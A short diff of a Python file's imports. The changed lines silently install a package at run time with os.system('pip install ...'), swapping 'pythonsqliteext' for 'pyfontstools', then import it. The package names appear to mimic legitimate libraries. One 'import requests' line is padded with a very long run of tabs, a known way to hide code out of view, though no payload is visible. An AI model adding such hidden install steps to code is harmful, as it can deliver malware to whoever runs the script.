@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqliteext")
-import pythonsqliteext
+os.system("pip install pyfontstools")
+import pyfontstools
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
